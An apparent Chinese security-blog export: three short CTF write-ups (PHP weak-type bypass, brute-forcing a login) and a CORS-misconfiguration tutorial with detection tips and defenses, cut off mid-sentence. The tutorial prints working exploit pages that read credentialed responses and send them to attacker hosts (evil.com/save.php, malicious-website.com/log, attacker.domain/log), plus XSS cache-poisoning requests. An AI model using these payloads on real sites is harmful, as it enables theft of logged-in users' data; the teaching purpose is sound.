[{"title":"攻防世界-disabled_button","url":"/2023/07/27/disabled_button/","content":"题目描述：\nX老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？\n题目解题：\n首先进入题目发现如下页面：\n\n根据已有的题目信息，我们猜测大概率是要想方法成功点击flag按钮即可，结合题目描述，我们要借助前端知识。\n首先查看了源代码\n\n我们看到这里在flag按钮处有一个disabled属性，这导致了他的不可点击，接下来先上一手GPT回答\n&lt;input disabled class=&quot;btn btn-default&quot; style=&quot;height:50px;width:200px;&quot; type=&quot;submit&quot; value=&quot;flag&quot; name=&quot;auth&quot; /&gt;：    一个输入元素，type为&quot;submit&quot;，表示提交按钮；    name为&quot;auth&quot;；    value为&quot;flag&quot;，显示在按钮上的文本；    disabled属性设置为&quot;disabled&quot;，使按钮不可点击；    class为&quot;btn btn-default&quot;，这个class来自之前引用的Bootstrap样式表，用于设置按钮的样式；    style属性设置了按钮的高度和宽度。\n也就是说我们需要想办法去掉disabled这个属性，那么很明显我们直接F12进控制台修改即可\n\n只需将上图的disabled属性去除即可\n\n可以发现按钮亮度变量，即我们可以点击了，不过我再第一次点击的时候仍然没反应，页面直接刷新到初始状态，由此我们尝试bp抓包\n\n如上图成功拿到flag\n","categories":["攻防世界"]},{"title":"攻防世界-simple_php","url":"/2023/07/27/simple_php/","content":"题目描述：\n小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。\n题目解题：\n打开页面后，发现简单的PHP代码，开始审计\n&lt;?phpshow_source(__FILE__);include(&quot;config.php&quot;);$a=@$_GET[&#x27;a&#x27;];$b=@$_GET[&#x27;b&#x27;];if($a==0 and $a)&#123;    echo $flag1;&#125;if(is_numeric($b))&#123;    exit();&#125;if($b&gt;1234)&#123;    echo $flag2;&#125;?&gt;\n如上代码我们可以发现，如果’a==0‘为true，但a本身不是0，则输出一部分flag，接下来判断b，如果b不是数字，且b大于1234，则输出剩下部分的flag\n首先a是一个弱类型比较，而比较有如下情况\nvar_dump(&#x27;a&#x27; == 0);\t//bool(true)var_dump(&#x27;1a&#x27; == 1);\t//bool(true)var_dump(&#x27;12a&#x27; == 1);\t//bool(false)1. 字符串在和数字比较的时候会将字符串转化为数字，比如a转换失败成False，False又和0弱类型比较是相等的，所以第一个是true。2. 但是如果字符串是以数字开头的，那么就会转成这个数字再做比较，所以第二个也是true，第三个则是因为转成数字后变成了12，不等于1，则为false。 \n那很明显我们令a=a即可绕过\n针对b利用的是is_numeric函数特性\n\n方法一\n利用数组+十六进制来进行绕过，此方法由于is_numeric函数不能处理数组，那么该函数会返回false\nb[]=58B\n方法二\n\nb=1235%20b=1235%00\n方法三\nphp中当一个其他数据类型和数值类型的数据比较大小时，会先将其他数据类型转换成数值类型，这里输入类似9999a数据也可绕过\nb=1235a\n此函数若是在sql注入中碰到也可以用16进制来绕过，将sql语句转为16进制字符串即可\n如下图成功得到flag\n\n","categories":["攻防世界"]},{"title":"攻防世界-weak_auth","url":"/2023/07/27/weak_auth/","content":"题目描述：\n小宁写了一个登陆验证页面，随手就设了一个密码。\n题目解题：\n打开页面发现如下图是一个简单的登录页面\n\n我们随便输一组账号密码看看\n\n发现其在弹出一个密码错误的边框后，页面跳到check.php页面，查看源代码发现\n\n这大概率就是要bp爆破了，我们不急，现在登录页面尝试几手\n\n我们此次修改了账户名，发现如上弹框，这说明我们必须以admin身份登录，因此只需要抓包爆破password即可\n\n\n如图设置好后开始爆破\n\n如图发现明显点，点击看看响应\n\n找到flag\n","categories":["攻防世界"]},{"title":"CORS跨域漏洞","url":"/2023/07/26/CORS%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E/","content":"CORS跨域漏洞\n0x01 漏洞简介\n​\t\t跨域资源共享(CORS)是一种放宽同源策略的机制，它允许浏览器向跨源服务器，发出 XMLHttpRequest 请求，从而克服了 AJAX 只能同源使用的限制，以使不同的网站可以跨域获取数据，目前已经被绝大多数浏览器支持，并被主流网站广泛部署使用。跨域资源共享 CORS 漏洞主要是由于程序员配置不当，对于 Origin 源校验不严格，从而造成跨域问题，攻击者可以利用 CORS 错误配置漏洞，从恶意网站跨域读取受害网站的敏感信息。\n​\t\t是H5提供的一种机制，WEB应用程序可以通过在HTTP增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。\n同源策略\n​\t\t这里我们必须要了解一下同源策略：同源策略是一种限制性的跨域规范，它限制了网站与源域之外的资源进行交互的能力。起源于多年前的策略是针对潜在的恶意跨域交互（例如，一个网站从另一个网站窃取私人数据）而制定的。通常，它允许一个域向其他域发出请求，但不允许访问响应。源由通信协议，域和端口号组成。\n​\t\tSOP是一个很好的策略，但是随着Web应用的发展，网站由于自身业务的需求，需要实现一些跨域的功能，能够让不同域的页面之间能够相互访问各自页面的内容。\n简单来说:同时满足同协议，同域名，同端口这三个条件，就是同源。\n\t\t浏览器的同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。\n\nSOP全称为Same Origin Policy即同源策略，该策略是浏览器的一个安全基石，同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。简单来说同源策略就是浏览器会阻止一个源与另一个源的资源交互。可以试想一下，如果没有同源策略，当你访问一个正常网站的时候又无意间打开了另一个恶意网站，恶意网站会从你刚刚访问的正常网站上窃取你全部的信息。\n\n跨域访问的一些场景\n\n比如后端开发完一部分业务代码后，提供接口给前端用，在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问的问题。\n程序员在本地做开发，本地的文件夹并不是在一个域下面，当一个文件需要发送ajax请求，请求另外一个页面的内容的时候，就会跨域。\n电商网站想通过用户浏览器加载第三方快递网站的物流信息。\n子站域名希望调用主站域名的用户资料接口，并将数据显示出来。\n\n跨域请求方式\nCORS定义了两种跨域请求，简单跨域请求和非简单跨域请求。只要同时满足以下两大条件，就属于简单请求。\n请求方法是以下三种方法之一：- HEAD- GET- POST\nHTTP的头信息不超出以下几种字段：- `Accept`- `Accept-Language`- `Content-Language`- `Last-Event-ID`- `Content-Type`：只限于三个值`application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`\n简单的说就是设置了一个白名单，符合这个条件的才是简单请求。其他不符合的都是非简单请求。\n浏览器对简单请求和非简单请求的处理机制不一样。\n对于简单请求，浏览器就会立刻发送这个请求。\n对于非简单请求，浏览器不会马上发送这个请求，而是有一个preflight，跟服务器验证的过程。浏览器先发送一个options方法的预检请求。\n0x02 CORS跨域原理及漏洞成因\n​\t\t浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。\n​\t\t对于简单请求，大致流程是浏览器发现这一次向服务器提交的请求是简单请求，所以自动在头信息中增加了一个Origin的字段，用来表示这次的请求来自哪个域。当服务器接收到请求后发现Origin字段指定的域名在许可范围内，服务器会在响应包中增加三个与CORS相关的字段，Access-Control-Allow-Origin、Access-Control-Allow-Credentials、Access-Control-Expose-Headers。其中Access-Control-Allow-Origin字段是必须存在的，它的值可能是Origin字段的值或者是一个通配符“*”，表示可以接受任意域名的请求，当然大部分服务器如果配置了通配符的话，信息泄露的风险骤然加大。再回到三个字段上，其中Access-Control-Allow-Credentials字段不是必选字段，它的值是一个布尔值且只能设置为true，表示服务器允许浏览器将cookie包含在请求中，否则就不添加此字段。但需要注意的是，如果要发送cookie，Access-Control-Allow-Origin就不能设为星号，必须明确指定与请求网页一致的域名，同时Cookie依然遵循同源策略。而Access-Control-Expose-Headers字段主要是指定想要获取XMLHttpRequest对象中getResponseHeader（）方法的其他服务器字段。\n​\t\t所谓非简单请求就是那种对服务器提出特殊要求的请求，例如请求方法为PUT或DELETE。非简单的CORS请求会在正式通信之前，增加一次HTTP查询请求，称之为“预检请求”。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单里以及可以使用哪些HTTP动词和头信息字段。只有获得了肯定响应，浏览器才会正式发出XMLHttpRequest请求否则就报错。这种请求的好处是对传统的没有CORS支持的服务器减小压力，给服务器一个提前拒绝的机会。具体流程如下，当构造请求包的方法是PUT或DELETE并传给浏览器时，浏览器发现此请求是非简单请求所以浏览器构造一个预检请求包，请求头是OPTIONS，并携带三个关键字段，Origin、Access-Control-Request-Method、Access-Control-Request-Headers。其中Access-Control-Request-Method表示浏览器的CORS请求会用到哪些HTTP方法，Access-Control-Request-Headers表示浏览器CORS请求会额外发送的头信息字段。服务器收到预检请求后，检查了三个核心字段以后如果确定允许跨域请求，会返回一个正常的HTTP回应，并携带传入的CORS头信息。如果服务器否定请求，虽然也会返回一个正常的HTTP回应但是没有任何CORS相关的头信息字段，或明确表示请求不符合条件。浏览器根据预请求的返回结果决定接下来是进行简单请求还是拒绝请求。\n​\t\tCORS使用检查请求头的相关字段和服务端的规则进行对比，来选择是否允许跨域。但凡是需要配置规则的程序，避免不了会出现一些意外，就像很多资深程序员有时也会写不出恰当的正则一样，当服务端配置的规则不够合理，导致非同域的资源可以互相访问，例如Access-Control-Allow-Origin: *。CORS反而使同源策略的保护机制土崩瓦解。因此，CORS漏洞的成因很明显，就是服务端配置的规则不当所导致的。\n0x03 CORS漏洞攻击流程\n\n1.假设用户登陆一个含有CORS配置网站foo.com，同时又访问了攻击者提供的一个链接evil.com。\n2.evil.com的网站向foo.com这个网站发起请求获取敏感数据，浏览器能否接收信息取决于foo.com的配置。\n3.如果foo.com配置了Access-Control-Allow-Origin头且为预期，那么允许接收，否则浏览器会因为同源策略而不接收。\nhttp://foo.com/index.php代码如下\nhttp://foo.com/phpinfo.php代码如下\n\n在访问index.php后再次访问phpinfo.php就可以在phpinfo页面发现httponly的COOKIE，在这里我们假设此cookie就是黑客想要获取的敏感信息。\n\n然后构造黑客发生送给用户的恶意页面http://evil.com/steal.html\n&lt;!DOCTYPE&gt;&lt;html&gt;&lt;h1&gt;CORS test&lt;/h1&gt;&lt;script type=&quot;text/javascript&quot;&gt;function loadXMLDoc()&#123;    var xhr1;    var xhr2;\t    if(window.XMLHttpRequest)    &#123;        xhr1 = new XMLHttpRequest();        xhr2 = new XMLHttpRequest();    &#125;    else    &#123;        xhr1 = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);        xhr2= new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);    &#125;    xhr1.onreadystatechange=function()    &#123;        if(xhr1.readyState == 4 &amp;&amp; xhr1.status == 200) //if receive xhr1 response        &#123;            var datas=xhr1.responseText;            xhr2.open(&quot;POST&quot;,&quot;http://evil.com/save.php&quot;,&quot;true&quot;);\t\t\talert(&#x27;3&#x27;);            xhr2.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded;charset=utf-8&quot;);            xhr2.send(&quot;T1=&quot;+escape(datas));              &#125;    &#125;    xhr1.open(&quot;GET&quot;,&quot;http://foo.com/phpinfo.php&quot;,&quot;true&quot;) //request user page.    alert(xhr1.responseText);\txhr1.withCredentials = true;        //request with cookie    xhr1.send();&#125;loadXMLDoc();&lt;/script&gt;&lt;/html&gt;\n当用户点开此网页时，由evil.com通过AJAX发出一个向foo.com的资源请求，所以浏览器自动添加了Origin字段。\n\n接下来黑客将获取到的敏感信息POST提交到save.php中，而save.php将数据保存在phpinfo.html里。evil.com/save.php代码如下：\n\n黑客的请求流程是steal.html-&gt;phpinfo.php-&gt;save.php。我们通过BurpSuite的Repeater功能重放抓到的phpinfo.php请求包可以发现响应包是含有返回内容的，也就是请求到的资源。\n\n但是在save.php中并没有返回的资源，通过检查浏览器的控制台提示信息发现，由于响应包缺少Access-Control-Allow-Origin响应头，导致浏览器拦截了跨源请求。\n\n去掉foo.com/phpinfo.php服务端的注释\n\n重新访问http://evil.com/steal.html\n\n发现响应包中出现了对应的CORS响应头，Access-Control-Allow-Origin指是允许访问的源，Access-Control-Allow-Credentials指的是允许带上cookie访问资源。这样浏览器就不会出错而拦截请求了，随后js脚本把页面编码后发送到evil.com/save.php去\n模拟黑客访问evil.com/phpinfo.html页面，可以发现已经被窃取过来的敏感信息。至此成功利用CORS漏洞进行跨域资源访问。\n\n0x04 修复及防御方式\n1.仔细评估是否开启CORS，如果不必要就不要开启CORS2.如果是绝对必要的话，要定义“源”的白名单。尽量不使用正则表达式配置，不要配置“Access-Contol-Allow-Origin”为通配符“*”，同时严格校验来自请求的Origin值。3.仅仅允许安全的协议，有必要验证协议以确保不允许来自不安全通道（HTTP）的交互，否则中间人(MitM)将绕过应用是所使用的HTTPS4.要尽可能的返回&quot;Vary: Origin&quot;这个头部，以避免攻击者利用浏览器缓存5.如果可能的话避免使用“Credentials”头，由于“Access-Control-Allow-Credentials”标头设置为“true”时允许跨域请求中带有凭证数据，因此只有在严格必要时才应配置它。此头部也增加了CSRF攻击的风险;因此，有必要对其进行保护。6.限制使用的方法，通过“Access-Control-Allow-Methods”头部，还可以配置允许跨域请求的方法，这样可以最大限度地减少所涉及的方法。7.限制缓存的时间，通过“Access-Control-Allow-Methods”和“Access-Control-Allow-Headers”头部，限制浏览器缓存信息的时间。可以通过使用“Access-Control-Max-Age”标题来完成，该头部接收时间数作为输入，该数字是浏览器保存缓存的时间。配置相对较低的值（例如大约30分钟），确保浏览器在短时间内可以更新策略（比如允许的源）。8.仅配置所需要的头，仅在接收到跨域请求的时候才配置有关于跨域的头部，并且确保跨域请求是合法的（只允许来自合法的源）。\n0x05 简单请求的示例\n跨域资源共享（CORS）规范规定了在Web服务器和浏览器之间交换的标头内容，该标头内容限制了源域之外的域请求web资源。CORS规范标识了协议头中Access-Control-Allow-Origin最重要的一组。当网站请求跨域资源时，服务器将返回此标头，并由浏览器添加标头Origin。\n例如下面的来自站点 http://example.com 的网页应用想要访问 http://bar.com 的资源：\nrequests\n1  GET /resources/public-data/ HTTP/1.12  Host: bar.com3  User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre4  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.85  Accept-Language: en-us,en;q=0.56  Accept-Encoding: gzip,deflate7  Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.78  Connection: keep-alive9  Referer: http://example.com/examples/access-control/simpleXSInvocation.html10 Origin: http://example.com\nresponse\n11  HTTP/1.1 200 OK12  Date: Mon, 01 Dec 2020 00:23:53 GMT13  Server: Apache/2.0.61 14  Access-Control-Allow-Origin: *15  Keep-Alive: timeout=2, max=10016  Connection: Keep-Alive17  Transfer-Encoding: chunked18  Content-Type: application/xml\n第 1~9 行是请求首部。在第10行的请求头 Origin 表明该请求来源于 http://example.com。\n第 11~18 行是来自于 http://bar.com 的服务端响应。响应中携带了响应首部字段 Access-Control-Allow-Origin（第 14 行）。使用 Origin 和 Access-Control-Allow-Origin 就能完成最简单的访问控制。本例中，服务端返回的 Access-Control-Allow-Origin: * 表明，该资源可以被任意外域访问。如果服务端仅允许来自 http://example.com 的访问，该首部字段的内容如下：\nAccess-Control-Allow-Origin: http://example.com\n如果跨域请求可以包含cookie的话，在服务器响应里应该有这一字段：\nAccess-Control-Allow-Credentials: true\n这样的话攻击者就可以利用这个漏洞来窃取已经在这个网站上登录了的用户的信息（利用cookie）\n0x06 漏洞利用\n这里以droabox靶场为例\n\n这个接口会返回已登录的用户的信息数据，通过访问该网页的响应我们看到这里可能存在CORS跨域资源共享漏洞\n\n接下来我们就可以建立一个恶意的js代码\n&lt;!-- cors.html --&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;cors exp&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;function cors() &#123;  var xhttp = new XMLHttpRequest();  xhttp.onreadystatechange = function() &#123;        if (this.status == 200) &#123;        alert(this.responseText);         document.getElementById(&quot;demo&quot;).innerHTML = this.responseText;    //作用解释如下    &#125;  &#125;;  xhttp.open(&quot;GET&quot;, &quot;http://192.168.0.101/DoraBox/csrf/userinfo.php&quot;);  xhttp.withCredentials = true;  xhttp.send();&#125;cors();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n//document.getElementById(&quot;demo&quot;).innerHTML = this.responseText;这段代码的作用是将 this.responseText 的内容设置为具有 id &quot;demo&quot; 的元素的内部 HTML。具体解释如下：document.getElementById(&quot;demo&quot;) 是一个 DOM 方法，它通过元素的 id 属性获取对应的 HTML 元素。在这个例子中，它获取具有 id &quot;demo&quot; 的元素。.innerHTML 是获取或设置 HTML 元素的内部 HTML 内容的属性。通过将等号右侧的值赋给它，可以更新元素的内部 HTML 内容。this.responseText 是 XMLHttpRequest 对象的属性，它包含从服务器返回的响应文本。因此，这行代码的作用是将服务器返回的响应文本（this.responseText）设置为具有 id &quot;demo&quot; 的元素的内部 HTML 内容。这样，在网页中具有 id &quot;demo&quot; 的元素会显示服务器返回的文本内容。\n访问这个页面就可以获取已登录的用户的信息\n\n该恶意代码首先定义一个函数cors，以get形式访问目标网址，创建XMLHttpRequest对象为xhttp，通过ajax的onreadystatechange判断请求状态，如果请求已完成，且相应已就绪，则弹出返回文本。\n0x07 漏洞发现技巧\n在之前我们了解了一些关于CORS跨域资源共享通信的一些字段含义，\nCORS的漏洞主要看当我们发起的请求中带有Origin头部字段时，服务器的返回包带有CORS的相关字段并且允许Origin的域访问。\n方式一: BurpSuite\n一般测试WEB漏洞都会用上BurpSuite，而BurpSuite可以实现帮助我们检测这个漏洞。\n方式一: 首先是自动在HTTP请求包中加上Origin的头部字段，打开BurpSuite，选择Proxy模块中的Options选项，找到Match and Replace这一栏，勾选Request header 将空替换为Origin:example.com的Enable框。\n\n在Filter by search term 中输入：Access-Control-Allow-Origin: foo.example.org\n\nHTTP history列表中出现符合条件的请求包，点击Ctrl+R，点击GO，如下图，即该处有CORS漏洞。\n\n组合应是这种：\nAccess-Control-Allow-Origin: foo.example.orgAccess-Control-Allow-Credentials: true\n注意！如下组合是没有漏洞的。因为浏览器已经会阻止如下配置。\nAccess-Control-Allow-Origin: *Access-Control-Allow-Credentials: true\n当我们进行测试时，看服务器响应头字段里可以关注这几个点：\n最好利用的配置：\nAccess-Control-Allow-Origin: https://attacker.com\nAccess-Control-Allow-Credentials: true\n可能存在可利用的配置：\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true\n很好的条件但无法利用：\n下面这组配置组合虽然看起来很完美但是CORS机制已经默认自动禁止了这种组合，算是CORS的最后一道防线\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n单一的情况\n方式二: Access-Control-Allow-Origin：\ncurl命令，输入curl http://127.0.0.1/DoraBox-master/csrf/userinfo.php -H &quot;Origin:https://example.com/&quot; -I\n\n如果出现这种组合，说明存在CORS漏洞\nAccess-Control-Allow-Origin: foo.example.orgAccess-Control-Allow-Credentials: true\n方式三: 使用CORScanner工具(漏洞自动化扫描)\ngithub上提供了一个关于扫描CORS配置漏洞的脚本\nhttps://github.com/chenjj/CORScanner\nCORScanner是一个python工具，旨在发现网站的CORS错误配置漏洞。它可以帮助网站管理员和渗透测试人员检查他们针对的域/ URL是否具有不安全的CORS策略。\n\n总结漏洞的原因：\n1：CORS服务端的 Access-Control-Allow-Origin 设置为了 *，并且 Access-Control-Allow-Credentials 设置为false，这样任何网站都可以获取该服务端的任何数据了。\n2：有一些网站的Access-Control-Allow-Origin他的设置并不是固定的，而是根据用户跨域请求数据的Origin来定的。这时，不管Access-Control-Allow-Credentials 设置为了 true 还是 false。任何网站都可以发起请求，并读取对这些请求的响应。意思就是任何一个网站都可以发送跨域请求来获得CORS服务端上的数据。\n安全隐患\n这个流程中。服务器接收到跨域请求的时候，并没有先验证，而是先处理了请求。所以从某种程度上来说。在支持CORS的浏览器上实现跨域的写资源，打破了传统同源策略下不能跨域读写资源。\n如果将Access-Control-Allow-Origin设置为允许来自所有域的跨域请求。那么CORS的安全机制几乎就无效了。但是这里在设计的时候有一个很好的限制。xmlhttprequest发送的请求需要使用“withCredentials”来带上cookie，如果一个目标域设置成了允许任意域的跨域请求，这个请求又带着cookie的话，这个请求是不合法的。（就是如果需要实现带cookie的跨域请求，需要明确的配置允许来源的域，使用任意域的配置是不合法的）浏览器会屏蔽掉返回的结果。\n0x08 其他可能利用漏洞的地方\n8.1 解析Origin头时出错\n一些支持从多个来源进行访问的应用程序通过使用允许的来源白名单来实现。收到CORS请求后，会将提供的来源与白名单进行比较。如果来源出现在白名单中，那么它会反映在Access-Control-Allow-Origin标题中，以便授予访问权限。例如，web应用收到一个正常的请求：\nGET /data HTTP/1.1Host: bar.com...Origin: https://example.com\nweb应用根据其允许的来源列表检查当前请求资源的来源，如果在列表中，则按以下方式反映该来源：\nHTTP/1.1 200 OK...Access-Control-Allow-Origin: https://example.com\n但在检测来源是否存在于白名单时经常可能出现问题，一些网站可能会允许其所有的子域（包括尚未存在未来可能存在的子域）来进行访问，或者允许其他网站的域以及其子域来访问请求。这些请求一般都通过通配符或者正则表达式来完成，但是如果这其中出现错误可能就会导致给予其他未被授权的域访问权限。例如：\n例如，假设一个应用程序授予对以下列结尾的所有域的访问权限：\nexample.com\n攻击者可能可以通过注册域来获得访问权限：\nexeexample.com\n或者，假设应用程序授予对所有以example.com开头的域访问权限，攻击者就可以使用该域获得访问权限：\nexample.com.evil-user.net\n8.2 利用相互受CORS信任的域来进行XSS\n假如两个互相受信任的源，如果其中一个网站存在XSS，攻击者就可以利用XSS注入一些JavaScript代码，利用这些代码对信任其源的另一个网站进行敏感信息的获取。\n如果进行CORS请求时网站响应：\nHTTP/1.1 200 OKAccess-Control-Allow-Origin: https://vulnerable.comAccess-Control-Allow-Credentials: true\n就可以利用XSS漏洞在vulnerable.com网站上使用下面的URL来通过检索API密钥：\nhttps://vulnerable.com/?xss=&lt;script&gt;cors-stuff-here&lt;/script&gt;\n8.3 白名单中的null值\nCORS协议的一个重要安全前提是跨域请求中的Origin头不能被伪造，这个前提并不是总是成立。Origin头最早被提出用于防御CSRF攻击，它的语法格式在RFC 6564中被定义。RFC 6564规定，如果请求来自隐私敏感上下文时，Origin头的值应该为null，但是它却没有明确界定什么是隐私敏感上下文。\nCORS协议复用了Origin头，但在CORS标准中同样缺乏对跨域请求Origin中null明确的定义和限制。有些开发者在网站上配置信任 null，用于与本地file页面共享数据，如下所示：\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true\n在这种情况下，攻击者可以使用各种技巧来生成跨域请求，该请求构造的Origin为null值。这将满足白名单的要求，从而导致跨域访问。例如，可以使用iframe以下格式的沙盒跨域请求来完成：\n&lt;iframe sandbox=&quot;allow-scripts allow-top-navigation allow-forms&quot; src=&quot;data:text/html,&lt;script&gt;var req = new XMLHttpRequest();req.onload = reqListener();req.open(&#x27;get&#x27;,&#x27;vulnerable-website.com/sensitive-victim-data&#x27;,true);req.withCredentials = true;req.send();function reqListener() &#123;location=&#x27;malicious-website.com/log?key=&#x27;+this.responseText;&#125;;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;\n这就意味着任何配置有Access-Control-Allow-Origin: null和Access-Control-Allow-Credentials:true的网站等同于没有浏览器SOP的保护，都可以被其他任意域以这种方式读取内容。\n0x09 利用CORS漏洞(偏实际环境)\n流程:\n\n假设用户登陆一个含有CORS配置网站vuln.com，同时又访问了攻击者提供的一个链接evil.com。\nevil.com的网站向vuln.com这个网站发起请求获取敏感数据，浏览器能否接收信息取决于vuln.com的配置。\n如果vuln.com配置了Access-Control-Allow-Origin头且为允许接收，否则浏览器会因为同源策略而不接收。\n\n方式一：存在用户凭证\n\n详细过程\n\n\n创建一个JavaScript脚本去发送CORS请求，poc关键代码如下：\n   var req = new XMLHttpRequest();    req.onload = reqListener();    req.open(“get”,”https://vulnerable.domain/api/private-data”,true);    req.withCredentials = true;   req.send();    function reqListener() &#123;    location=”//attacker.domain/log?response=”+this.responseText;    &#125;;2. 当带有目标系统的用户访问的主机访问上述代码的页面时，浏览器就会发送下面的请求到存在CORS配置的服务器。```httpGET /api/private-data HTTP/1.1 Host: vulnerable.domain Origin: https://attacker.domain/ Cookie: JSESSIONID=&lt;redacted&gt;```3. 响应包```httpHTTP/1.1 200 OK Server: Apache-Coyote/1.1 Access-Control-Allow-Origin: https://attacker.domain Access-Control-Allow-Credentials: true Access-Control-Expose-Headers: Access-Control-Allow-Origin,Access-Control-Allow-Credentials Vary: Origin Expires: Thu, 01 Jan 1970 12:00:00 GMT Last-Modified: Wed, 02 May 2018 09:07:07 GMT Cache-Control: no-store, no-cache, must-revalidate, max-age=0, post-check=0, pre-check=0 Pragma: no-cache Content-Type: application/json;charset=ISO-8859-1 Date: Wed, 02 May 2018 09:07:07 GMT Connection: close Content-Length: 149 &#123;&quot;id&quot;:1234567,&quot;name&quot;:&quot;Name&quot;,&quot;surname&quot;:&quot;Surname&quot;,&quot;email&quot;:&quot;email@target.local&quot;,&quot;account&quot;:&quot;ACT1234567&quot;,&quot;balance&quot;:&quot;123456,7&quot;,&quot;token&quot;:&quot;to p-secret-string&quot;&#125;```3. 因为服务器发送了右边的“ Access-Control-Allow- *”给客户端，所以，攻击的浏览器允许包含恶意的JavaScript代码的页面访问用户的隐私数据。#### 方式二：不存在用户凭证![image-20230510212310583](CORS跨域漏洞/image-20230510212310583.png)**详细过程**1. 攻击方式1：绕过基于IP的认证   如果目标应用程序与受害者的网络可达性，并且目标应用程序使用IP地址作为身份验证的方式，则黑客会利用受害者的浏览器作为代理去访问那些目标应用程序并且可以绕过那些基于IP的身份验证。2. 攻击方式2：客户端缓存中毒   例如，数据报文头部中包含`X-User`标头，其值未进行任何输入验证，输出编码。   请求包```httpGET /login HTTP/1.1 Host: www.target.local Origin: https://attacker.domain/ X-User: &lt;svg/onload=alert(1)&gt;```响应包`Access-Control-Allow-Origin`已被设置，`Access-Control-Allow-Credentials: true`与`Vary: Origin`头适合设置```httpHTTP/1.1 200 OK Access-Control-Allow-Origin: https://attacker.domain/ … Content-Type: text/html … Invalid user: &lt;svg/onload=alert(1)&gt;```构造存在恶意的XSS有效负载页面，诱使受害者触发。```JavaScriptvar req = new XMLHttpRequest(); req.onload = reqListener;req.open(&#x27;get&#x27;,&#x27;http://www.target.local/login&#x27;,true); req.setRequestHeader(&#x27;X-User&#x27;, &#x27;&lt;svg/onload=alert(1)&gt;&#x27;);req.send(); function reqListener() &#123; location=&#x27;http://www.target.local/login&#x27;; &#125;```1. 攻击方式3：服务器端缓存中毒   利用CORS的错误配置注入任意HTTP头部，将其保存在服务器端缓存中，可用于构造存储类型XSS。   利用条件：存在服务器端缓存，能够反射`Origin`头部，不会检查`Origin`头部中的特殊字符，如`\\r`   利用方式：攻击IE / Edge用户（IE / Edge使用`\\r`作为的HTTP标题段的终结符）请求包```httpGET / HTTP/1.1 Origin: z[0x0d]Content-Type: text/html; charset=UTF-7```回车（CR）：ASCII码：&#x27;\\r&#x27; ，十六进制：0x0d响应包```httpHTTP/1.1 200 OK Access-Control-Allow-Origin: z Content-Type: text/html; charset=UTF-7```如果攻击者能提前发送畸形的`Origin`消息头，则利用代理或命令行的方式发送，则服务器就会缓存这样的返回报文并作用于其他用户。上例中，攻击者将页面的编码设置为`UTF-7`，可引发XSS中断。#### 类型21.描述在正常的网页被嵌入了到攻击者控制页面的跨域请求，从而劫持用户的会话。2.挖掘同上3.利用1,交互式xss。通过CORS，绕过一些反会话劫持的方法，如HTTP-Only限制的cookie，绑定IP地址的会话ID等，劫持用户会话。2,程序猿在写ajax请求的时候，对目标域限制不严。有点类似于url跳转。facebook出现过这样一个案例。javascript通过url里的参数进行ajax请求。## 0x10 预防CORS漏洞CORS漏洞主要是由于配置错误而引起的。所以，预防漏洞变成了一个配置问题。下面介绍了一些针对CORS攻击的有效防御措施。1. 正确配置跨域请求   如果Web资源包含敏感信息，则应在Access-Control-Allow-Origin标头中正确指定来源。2. 只允许信任的网站   看起来似乎很明显，但是Access-Control-Allow-Origin中指定的来源只能是受信任的站点。特别是，使用通配符来表示允许的跨域请求的来源而不进行验证很容易被利用，应该避免。3. 避免将null列入白名单   避免使用标题Access-Control-Allow-Origin: null。来自内部文档和沙盒请求的跨域资源调用可以指定null来源。应针对私有和公共服务器的可信来源正确定义CORS头。4. 避免在内部网络中使用通配符   避免在内部网络中使用通配符。当内部浏览器可以访问不受信任的外部域时，仅靠信任网络配置来保护内部资源是不够的。5. CORS不能替代服务器端安全策略   CORS定义了浏览器的行为，绝不能替代服务器端对敏感数据的保护-攻击者可以直接从任何可信来源伪造请求。因此，除了正确配置的CORS之外，Web服务器还应继续对敏感数据应用保护，例如身份验证和会话管理。## 0x11 CORS靶场练习该靶场内置了3个 CORS 的漏洞场景- 场景一：信任任意 Origin 源- 场景二：正则表达式检测 Origin 源- 场景三：信任任意 null 源![image-20230510214108156](CORS跨域漏洞/image-20230510214108156.png) 漏洞检测: 一般情况下，修改请求包 Header 中的 Origin 字段为任意域名或者为 null 的方式去检测该漏洞是否存在。#### 场景一：信任任意 Origin 源应用程序接受来自任何 Origin 的 CORS 请求。该代码将 Origin 值放在 HTTP 响应头 Access-Control-Allow-Origin 中。现在，此配置将允许来自任何 Origin 的任何脚本向应用程序发出 CORS 请求。Web 浏览器将执行标准的 CORS 请求检查，来自恶意域的脚本将能够窃取数据。应用程序接受 Origin 标头中指定的任何值。![image-20230510215219591](CORS跨域漏洞/image-20230510215219591.png)可以看到箭头处的域名,是任意的,而该网站都允许域名发出请求并回显(origin处是我自己添加的)#### 场景二：正则表达式检测 Origin 源应用程序已实施 CORS 策略并对列入白名单的域/子域执行“正则表达式”检查。在这种情况下，应用程序在代码中具有弱正则表达式实现，它只检查 HTTP 请求 Origin 标头中任何位置的域名 b0x.com 的存在。如果 HTTP 标头 Origin 的值为 inb0x.com 或 